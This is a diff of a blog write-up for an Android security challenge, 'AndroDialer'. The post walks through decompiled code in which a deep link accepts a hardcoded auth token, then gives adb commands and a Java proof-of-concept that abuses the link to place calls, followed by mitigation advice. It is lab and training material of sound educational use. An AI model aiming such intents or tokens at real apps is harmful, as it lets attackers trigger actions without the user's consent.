@@ -1,16 +1,22 @@
 ---
 title: "Challenge 03: AndroDialer"
 published: 2025-09-22
-description: "Cracking an insecure encryption routine to recover secrets."
-image: "../../hextree.io/Hextree.io Intent Attack Writeup Part 1.webp"
+description: "Android Deep Link Vulnerability Analysis with hardcoded authentication tokens."
+image: "https://lwfiles.mycourse.app/66c35021da1fe6df974b8aee-public/42e3aa7f390f8662c067b48de036761c.png"
 category: "Mobile"
-tags: ["android", "crypto"]
+tags: ["android", "deep-links", "vulnerability"]
 series:
   id: "8ksec-android-challenges"
   order: 3
 ---
 
-# Android Deep Link Vulnerability Analysis: Hardcoded Token Bypass
+*( بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ )*
+
+:::caution
+ #FreePalastine
+:::
+
+# Android Deep Link Vulnerability Analysis: Hardcoded Token in Plainsight
 
 In this challenge, the application is vulnerable to deep link misconfiguration due to hardcoded token values combined with extensive permissions. Let's dive into the technical analysis.
 
@@ -43,20 +49,20 @@ if (data != null) {
 
 After that, it searches for the token in that URI in **5 different locations**:
 
-## 1. Intent Extras
+### 1. Intent Extras
 
 ```java
 ArrayList arrayList = new ArrayList();
 arrayList.add(getIntent().getStringExtra("enterprise_auth_token"));
 ```
 
-## 2. Query Parameters
+### 2. Query Parameters
 
 ```java
 arrayList.add(data.getQueryParameter("enterprise_auth_token"));
 ```
 
-## 3. Manual Query String Parsing
+### 3. Manual Query String Parsing
 
 ```java
 Pattern patternCompile = Pattern.compile("enterprise_auth_token=([^&]+)");
@@ -65,7 +71,7 @@ if (cVar != null && ((AbstractC0535a) cVar.g()).c() > 1) {
     arrayList.add(((C0533A) cVar.g()).get(1));
 ```
 
-## 4. Path Segments
+### 4. Path Segments
 
 ```java
 List<String> pathSegments2 = data.getPathSegments();
@@ -74,7 +80,7 @@ if (iIndexOf2 >= 0 && iIndexOf2 < pathSegments2.size() - 1) {
     arrayList.add(pathSegments2.get(iIndexOf2 + 1));
 ```
 
-## 5. Fragment Processing
+### 5. Fragment Processing
 
 ```java
 String fragment = data != null ? data.getFragment() : null;
@@ -82,7 +88,7 @@ if (fragment != null) {
     if (b.o0(fragment, "token=", false)) {
         arrayList.add(b.z0(b.x0(fragment, "token="), "&"));
     }
-    *// Multiple fragment parsing methods for different formats*`
+    // Multiple fragment parsing methods for different formats
 ```
 
 ## The Critical Discovery: Hardcoded Tokens
@@ -102,7 +108,7 @@ if (str5.equals("8kd1aL3R_s3Cur3_k3Y_2023") ||
 
 Then it extracts the phone number from the same URI using:
 
-## Intent Extras
+### Intent Extras
 
 ```java
 if (getIntent().hasExtra("phoneNumber")) {
@@ -110,7 +116,7 @@ if (getIntent().hasExtra("phoneNumber")) {
 }
 ```
 
-## Tel Scheme
+### Tel Scheme
 
 ```java
 else if (h.a(data2 != null ? data2.getScheme() : null, "tel")) {
@@ -118,7 +124,7 @@ else if (h.a(data2 != null ? data2.getScheme() : null, "tel")) {
 }
 ```
 
-## Custom dialersec Scheme
+### Custom dialersec Scheme
 
 ```java
 else if (h.a(data4 != null ? data4.getScheme() : null, "dialersec")) {
@@ -161,32 +167,63 @@ Or simply use the fragment approach:
 adb shell am start -a android.intent.action.VIEW -d 'dialersec://call?number=1234567890#token=8kd1aL3R_s3Cur3_k3Y_2023'
 ```
 
-I wrote a simple POC that I'll share on my GitHub:
+I wrote a simple `POC` that I'll share on my GitHub later but here is the important snippet:
+
+```java
+private void launchExploit() {
+        try {
+            // Single proof-of-concept attack using  discovered primary token
+            String exploitUri = "dialersec://call/token/8kd1aL3R_s3Cur3_k3Y_2023?number=1234567890";
+
+            Log.d(TAG, "Launching single PoC attack vector");
+            Log.d(TAG, "Exploit URI: " + exploitUri);
+
+            Intent maliciousIntent = new Intent(Intent.ACTION_VIEW);
+            maliciousIntent.setData(Uri.parse(exploitUri));
+            maliciousIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+
+            Log.d(TAG, "About to startActivity with maliciousIntent: " + maliciousIntent);
+            try {
+                startActivity(maliciousIntent);
+                Log.d(TAG, "Exploit launched: " + exploitUri);
+
+            } catch (Exception e) {
+                Log.e(TAG, "Exploit failed: " + exploitUri, e);
+            }
+
+            Log.d(TAG, "EXPLOIT COMPLETED");
+
+        } catch (Exception e) {
+            Log.e(TAG, "EXPLOIT FAILURE", e);
+        }
+    }
+```
 
 ![alt text](2025-09-22_14-15.png)
 
 Some important questions that came across my `n00bie` brain:
 
-## 1. What's the Real Vulnerability?
+## Key Questions & Analysis
+
+### 1. What's the Real Vulnerability?
 
 **The vulnerability has TWO components:**
 
-Deep Link Component
+**Deep Link Component:**
 
 - Custom scheme `dialersec://` can be **hijacked** by malicious apps
 - No domain verification like proper App Links
 - Multiple attack vectors through various parsing methods
 
-Hardcoded Token Component
+**Hardcoded Token Component:**
 
 - **Static credentials** `8kd1aL3R_s3Cur3_k3Y_2023` never change
 - **Reverse engineering** easily reveals tokens through decompilation
 - **No revocation mechanism** - tokens work forever once discovered
 
 > However, the hardcoded tokens are the PRIMARY vulnerability - even with secure deep links, static credentials make the backdoor exploitable.
->
 
-## 2. Device-Specific Behavior Mystery
+### 2. Device-Specific Behavior Mystery
 
 The second most important question is that the POC worked on:
 
@@ -202,18 +239,16 @@ But it **could not work** on a Xiaomi device using Android 10. When starting the
 - Fragment stripping from suspicious URIs
 - Enhanced security policies for cross-app communication
 
-This demonstrates how different Android implementations handle the same vulnerability differently, with some OEMs providing additional security layers that mitigate specific attack vectors.
+Do you have an answer? will be waiting :"D
 
 ## Mitigation Recommendations
 
-To secure against this type of vulnerability:
+A hacker only knows how to exploit, but a proffesional knows how to do both so, to secure against this type of vulnerability:
 
 1. **Replace hardcoded tokens** with dynamic, time-based authentication
 2. **Implement proper deep link validation** with input sanitization
 3. **Use App Links instead of custom schemes** for better security
-4. **Add rate limiting** and user confirmation for sensitive actions
-5. **Implement certificate pinning** for token validation
 
 ---
 
-*For more information about deep link best practices, visit the
+*For more information about deep link best practices, visit this* [Link](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks)
